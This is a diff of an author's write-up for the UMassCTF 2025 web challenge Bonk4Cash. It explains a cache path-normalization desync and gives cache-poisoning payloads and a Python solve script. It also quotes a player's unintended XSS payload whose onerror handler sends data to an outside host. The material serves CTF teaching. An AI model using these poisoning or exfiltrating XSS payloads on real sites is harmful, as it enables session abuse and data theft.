@@ -9,7 +9,7 @@ tags:
   - writeups
 description: Author writeup for UMassCTF 2025 web challenge
 ---
-Last weekend (April 18-20), the UMass Cybersecurity Club hosted a CTF. Aside from organizing the challenges for each category, I also wrote my own web challenge, Bonk4Cash. 
+Last weekend (April 18-20), the UMass Cybersecurity Club hosted [UMassCTF 2025](https://ctftime.org/event/2653). Aside from organizing the challenges for each category, I also wrote my own web challenge, Bonk4Cash. 
 
 My challenge was heavily inspired by [this talk](https://www.youtube.com/watch?v=70yyOMFylUA) by Martin Doyhenard on web cache exploitation, and you can see that reflected in the network diagram.
 
@@ -27,6 +27,7 @@ Playing around with the application, it seems that there are a few main function
 Let's first see what the goal is here.
 
 <div align="center" style="color:#888888">report endpoint from <code>server.js</code> on the web container</div>
+
 ```js
 app.post('/report/:username', utils.authMiddleware, async (req, res) => {
   let result;
@@ -62,6 +63,7 @@ The issue is, reporting a user just goes to the `/stats` page, which (theoretica
 My hope was that players would see the cache and see that they would have to do something with it (since why would it be there otherwise?).
 
 <div align="center" style="color:#888888">get route from <code>cache.py</code> on the cache container</div>
+
 ```python
 @server.route('/<path:path>')
 @server.route('/', defaults={'path':''})
@@ -119,7 +121,7 @@ resp = r.get(req, data=request.get_data(), headers=request.headers)
 Our cache is normalizing path to write the cache file, but sending the unnormalized path to the application server! This is a desync that we can leverage, so let's try to construct a PoC payload that can get our server to cache the wrong thing in a place we control.
 
 **0th attempt**: `GET /static/stats.js`
-```
+```html
 cache-1  | forwarding request to http://web:8002/static/stats.js
 cache-1  | wrote to cache/stats.js the following data:
 cache-1  | ... // normal stats.js content
@@ -128,7 +130,7 @@ cache-1  | ... // normal stats.js content
 
 
 **1st attempt**: `GET /static/stats.js/../../register`
-```
+```html
 cache-1  | forwarding request to http://web:8002/static/stats.js/../../register
 cache-1  | wrote to register the following data:
 cache-1  | ... // register response content
@@ -137,10 +139,10 @@ cache-1  | ... // register response content
 - Additionally, the forwarded request also looks like it's doing path normalization (just like if you put it in your browser), which explains why we get the same response as `http://web:8002/register`
 
 
-It seems that path normalization works, but where's the desync? Both attempts wrote the response to the same file name, but we want to write to `cache/stats.js` the contents of `http://web:8002/register`. The key here is that the cache write is being *normalized*, while the forwarded request is being *parsed as a URL*. They might seem similar, but there's a key difference: `#`/`?`/any other special URL delimiters. Let's try throwing one of those in there.
+It seems that path normalization works, but where's the desync? Both attempts wrote the response to the same file name, but we want to write to `cache/stats.js` the contents of `http://web:8002/register`. The key here is that the cache write is being ***normalized***, while the forwarded request is being ***parsed as a URL***. They might seem similar, but there's a key difference: `#`/`?`/any other special URL delimiters. Let's try throwing one of those in there.
 
 **2nd attempt**: `GET /static/stats.js?/../register`
-```
+```html
 cache-1  | forwarding request to http://web:8002/static/stats.js
 cache-1  | wrote to cache/stats.js the following data:
 cache-1  | ... // stats.js content
@@ -152,7 +154,7 @@ cache-1  | ... // stats.js content
 If the cache server is already parsing/seeing our `?` delimiter, let's try URL encoding it!
 
 **3rd attempt**: `GET /static/stats.js%3f/../register`
-```
+```html
 cache-1  | forwarding request to http://web:8002/static/stats.js?/../register
 cache-1  | wrote to cache/register the following data:
 cache-1  | ... // stats.js content
@@ -160,36 +162,37 @@ cache-1  | ... // stats.js content
 - That's what we're talking about! We got the cache to write the contents of `/static/stats.js` to `cache/register`!
 - Here, the cachefile path is being normalized from `cache/stat.js?/../register` to `cache/register`, and the forwarded request has a `?` in it, leading to the `web` container parsing the endpoint as `/static/stats.js`.
 
-Now, we want to reverse the order (ie write contents of `/transcript` to `cache/stats.js`). All we need to do is just reverse the order.
+Now, we want to reverse the order (ie write contents of `/register` to `cache/stats.js`). All we need to do is just swap register and stats.js.
 
-**4th attempt**: `GET /static/transcript%3f/../stats.js`
-- This time, we get an error `cannot get /static/transcript`. You can see why: our cache is trying to forward to `http://web:8002/static/transcript`, which doesn't exist!
+**4th attempt**: `GET /static/register%3f/../stats.js`
+- This time, we get an error `cannot get /static/register`. You can see why: our cache is trying to forward to `http://web:8002/static/register`, which doesn't exist!
 
-**5th attempt**: `GET /static/../transcript%3f/../stats.js`
-```
-cache-1  | forwarding request to http://web:8002/static/../transcript?/../stats.js
+**5th attempt**: `GET /static/../register%3f/../stats.js`
+```html
+cache-1  | forwarding request to http://web:8002/static/../register?/../stats.js
 cache-1  | wrote to stats.js the following data:
-cache-1  | ... // transcript content
+cache-1  | ... // register content
 ```
-- Nice! we wrote to an arbitrary cache file (`stats.js`) whatever endpoint we wanted (`transcript`). All that's left is to place the file in the right spot (since we're writing to `./stats.js` and the cache stores them in `./cache/stats.js)
+- Nice! we wrote to an arbitrary cache file (`stats.js`) whatever endpoint we wanted (`register`). All that's left is to place the file in the right spot (since we're writing to `./stats.js` and the cache actually stores them in `./cache/stats.js`)
 
-**Final payload**: `GET /static/../transcript%3f/../cache/stats.js`
-```
-cache-1  | forwarding request to http://web:8002/static/../transcript?/../cache/stats.js
+**Final payload**: `GET /static/../register%3f/../cache/stats.js`
+```html
+cache-1  | forwarding request to http://web:8002/static/../register?/../cache/stats.js
 cache-1  | wrote to cache/stats.js the following data:
-cache-1  | ... // transcript content
+cache-1  | ... // register content
 ```
+You can see that this is the same behavior as our 0th attempt, except for one key difference: the content of what's being written.
 
 
-*Side note*: you could also use `GET /static/../transcript/%3f/../../cache/stats.js` as the payload, why it works is left as an exercise to the reader.
-Additionally, using extra `../`s would result in a nginx 400 error: eg `GET /static/../transcript%3f/../../cache/stats.js` wouldn't work
+*Side note*: you could also use `GET /static/../register/%3f/../../cache/stats.js` as the payload, why it works is left as an exercise to the reader.
+Additionally, using extra `../`s would result in a nginx 400 error: eg `GET /static/../register%3f/../../cache/stats.js` wouldn't work.
 
 ## Now what?
-All we have now is the ability to poison any cache file with any endpoint we want. Since our admin goes to `/stats/username`, they will load the `stats.js` and `bundle.min.js` file, so we could theoretically poison those with a script that requests `/report/admin`.
+All we have now is the ability to poison any cache file with any endpoint we want. Since our admin goes to `/stats/username`, they will load the `stats.js` and `bundle.min.js` file, so we could theoretically poison one of those with a script that requests `/report/admin`.
 Well, all of our chat input is being written to `/transcript`, so that seems like a perfect candidate.
 
 The transcript seems to be formatted as follows:
-```
+```html
 [username] this is the latest message
 [username2] this message was sent first
 ```
@@ -223,7 +226,7 @@ All we need to do is make a JS payload that will
 
 There are plenty of ways to do this, but I chose to reuse code from the website, so our chain is as follows:
 1) admin visits `/stats/username` with poisoned `stats.js`
-2) `stats.js` will report the endpoint `/report/admin`
+2) `stats.js` will force the admin to report the endpoint `/report/admin`
 3) admin gets redirected to `/` with the flag, this has poisoned `index.js`
 4) `index.js` will send the flag as a message in the chat
 
@@ -276,7 +279,6 @@ initChat();/*
 ## Final solve script
 ```python
 import requests as r
-
 from websocket import create_connection
 import time
 import random
@@ -288,9 +290,12 @@ port = 80
 url_base = f"http://{remote}:{port}"
   
 s = r.Session();
+# create random username and register
 username = "".join(random.choice(string.ascii_lowercase) for i in range(20))
 resp = s.post(f"{url_base}/register", data={"username": username})
 print(resp)
+
+# open chat endpoint, authenticate, clear chat, and send comment end
 key = s.post(f"{url_base}/chatkey").text
 print(key)
 s.post(f"{url_base}/clearchat")
@@ -313,6 +318,7 @@ ws.send("""= [2];
   
 time.sleep(1)
 print("poisoning cache")
+# weird thing I had to do since python requests parses the url for you
 reprep = r.Request(method='GET', url=f"{url_base}/static/../transcript%253f/../cache/stats.js")
 prep = reprep.prepare()
 prep.url = f"{url_base}/static/../transcript%3f/../cache/stats.js"
@@ -355,6 +361,8 @@ print("reporting")
 s.post(f"{url_base}/report/{username}")
   
 time.sleep(5)
+
+# the admin's message with the flag is also saved in the transcript, so we can get it from there
 resp = s.get(f"{url_base}/transcript").text
 print(resp)
 reg = re.search(r'(UMASS{.*?})',resp).group()
@@ -363,14 +371,14 @@ print(reg)
 
 Flag: `UMASS{Adm1n_g0T_B0nk3d_EfAv4k7r3dJgTcbjmp}`
 
-
 ## What went wrong?
 <div id="wrong"></div>
+
 As I mentioned earlier, there were two main things that went wrong leading to unintended solves:
 - an unintentional XSS in the stats page
 - all of the containers having internet access
 
-**Unintentional XSS**
+#### Unintentional XSS
 I believed that `DOMPurify` would solve all of my XSS troubles, but apparently not.
 
 Since user's messages span lines **and** the `/stats/username` page filters the chat messages *after* the DOMPurify, you could construct a payload that wouldn't get filtered by the DOMPurify after it's run, but would expose an XSS after the filter is taken out:
@@ -393,10 +401,10 @@ Filtered log:
 [Blaklis10] <img src='http://blakl.is/aaa' onerror='fetch(`/report/admin`,{method:`POST`}).then(r=>fetch(`http://blakl.is/foo?resp=${btoa(r.url)}`))'"></i>
 ```
 
-Here, the quotes in the h1 tag "hide" the `img` tag from being purified, but once `[name]` is filtered out, the `img` tag is exposed to the user, causing XSS.
+Here, the quotes in the outer tag "hide" the `img` tag from being purified, but once `[name]` is filtered out, the `img` tag is exposed to the user, causing XSS.
 
 
-**Internet access on containers**
+#### Internet access on containers
 You can see in the docker compose file that only the  `nginx` container should have access to the internet, so the admin (on the `web` container) should not have access to the internet. This still is true if you run the source locally, but as always, there were infra issues.
 ```yaml
 services:
@@ -426,3 +434,5 @@ My goal with this is to force players to have to use what's provided (namely, th
 However, due to infra issues, our instancer was set up last minute using an AWS ECS that would launch ECS tasks for each instance. The way the ECS tasks were set up, everything had to be run exposed to the internet, which meant that the admin could send data to a webhook.
 
 Combining both of these issues, a player could have gotten a completely unintended solve that used an XSS to exfiltrate through a webhook instead of using cache poisoning to exfiltrate through the chat.
+
+## Thank you for playing in UMassCTF 2025! I hope you learned something new from this challenge/writeup.
